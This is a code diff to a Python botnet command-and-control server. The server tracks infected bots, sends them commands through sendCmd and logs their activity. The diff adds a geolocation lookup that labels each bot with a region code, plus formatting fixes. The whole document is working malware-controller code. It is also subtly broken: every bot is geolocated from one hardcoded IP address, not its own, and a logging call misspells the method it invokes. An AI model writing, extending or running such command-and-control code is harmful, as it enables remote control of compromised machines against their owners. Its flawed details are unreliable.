@@ -9,6 +9,7 @@ import select
 import base64
 import os
 import time
+import urllib.request
 
 
 class BotNet(Thread):
@@ -108,20 +109,20 @@ class BotNet(Thread):
             if spec:
                 if spec in self.onlineConnections:
                     bot = self.onlineConnections[spec]
-                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                 elif spec in self.offlineConnections:
                     bot = self.offlineConnections[spec]
-                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                 else:
                     return {}
             else:
                 dets = {}
                 for username in self.onlineConnections.keys():
                     bot = self.onlineConnections[username]
-                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
+                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                 for username in self.offlineConnections.keys():
                     bot = self.offlineConnections[username]
-                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
+                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                 return dets
 
     def run(self):
@@ -218,7 +219,7 @@ class BotNet(Thread):
             log = []
             if user in self.logs:
                 for entry in self.logs[user].log:
-                        log.append(entry)
+                    log.append(entry)
             return log
 
     def clearLog(self, user):
@@ -253,11 +254,11 @@ class BotNet(Thread):
     def sendCmd(self, user, cmd):
         with self.connlock:
             if user in self.onlineConnections:
-                self.logs[user].logsdin("(cmd \""+cmd+"\")")
+                self.logs[user].logsdin("(cmd \"" + cmd + "\")")
                 self.onlineConnections[user].send(cmd, sendtype="cmd")
                 return True
             elif user in self.offlineConnections:
-                self.logs[user].logsdin("(cmd \""+cmd+"\")")
+                self.logs[user].logsdin("(cmd \"" + cmd + "\")")
                 self.offlineConnections[user].send(cmd, sendtype="cmd")
                 return True
             self.socketio.emit('response',
@@ -349,6 +350,7 @@ class Bot:
         self.user = host_info['user']
         self.arch = host_info['arch']
         self.ip = host_info['addr']
+        self.state = self.getState('50.159.66.236')
 
         self.socketio = socketio
         self.lastonline = lastonline
@@ -359,6 +361,11 @@ class Bot:
         # Opqueue is a list of tuples of (function, (args...)) to be done once
         # the bot in online
         self.opqueue = []
+
+    def getState(self, ip):
+        response = urllib.request.urlopen("http://www.freegeoip.net/json/{}".format(ip)).read()
+        state = json.loads(response.decode('UTF-8'))['region_code']
+        return state
 
     def send(self, cmd, sendtype="stdin"):
         print("[*] Sending command of type {} to {}".format(sendtype, self.user))
@@ -494,7 +501,7 @@ class BotLog:
         self.maxlen = maxlen
         if not os.path.isdir(logdir):
             os.mkdir(logdir)
-        self.logpath = os.path.join(logdir, user+".log")
+        self.logpath = os.path.join(logdir, user + ".log")
         self.logobj = open(self.logpath, "a")
 
     def logstdin(self, win):
